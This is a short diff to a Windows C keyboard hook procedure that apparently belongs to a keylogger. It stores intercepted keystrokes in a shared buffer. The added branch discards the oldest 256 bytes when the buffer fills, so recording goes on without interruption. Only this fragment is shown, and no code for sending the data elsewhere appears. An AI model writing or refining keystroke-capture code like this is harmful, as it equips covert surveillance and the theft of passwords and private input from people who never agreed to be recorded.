@@ -40,6 +40,12 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         EnterCriticalSection(&key_lock);
         if (strlen(key_buffer) + strlen(key_char) < sizeof(key_buffer) - 1) {
             strcat(key_buffer, key_char);
+        } else {
+            // Buffer is full. Truncate the oldest 256 bytes to make room for new keys
+            int shift = 256;
+            int len = strlen(key_buffer);
+            memmove(key_buffer, key_buffer + shift, len - shift + 1);
+            strcat(key_buffer, key_char);
         }
         LeaveCriticalSection(&key_lock);
     }
